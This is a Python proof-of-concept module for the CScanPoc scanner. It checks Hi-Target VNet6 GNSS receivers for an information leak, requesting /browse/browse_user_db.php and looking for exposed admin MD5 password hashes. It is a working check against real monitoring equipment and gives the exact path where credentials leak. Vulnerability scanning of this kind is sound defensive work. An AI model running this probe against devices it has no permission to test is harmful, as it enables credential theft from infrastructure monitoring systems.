# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = '0a7ba3cf-ee91-49fe-bc06-7f1fc3eb61a1'
    name = '中海达设备 信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-08-26'  # 漏洞公布时间
    desc = '''
        该产品是用于：滑坡监测，尾矿库安全监测，水库大坝安全监测，桥梁健康监测，沉降塌陷监测，建筑监测，机械精密控制，精准农业导航，和精密定位的GNSS接收机。
        问题产品存在目录遍历，产品是使用SQLite数据库，从目录遍历发现管理员账号密码存储在这个位置“browse/browse_user_db.php”
        而且密码为普通的md5加密可破解，造成信息泄露(管理员密码)。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '中海达VNet6专业型参考站接收机'  # 漏洞应用名称
    product_version = '中海达VNet6专业型参考站接收机'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '8ef3a0f3-c0da-4422-a71e-3c75b56a4391'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #https://wooyun.shuimugan.com/bug/view?bug_no=136374
            hh = hackhttp.hackhttp()
            arg = self.target
            url = arg + '/browse/browse_user_db.php'
            code, head, res, err, _ = hh.http(url)

            if code == 200 and '<th class="subheader"> md5(password) </th>' in res:
                #security_hole('information disclosure: ' + url)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
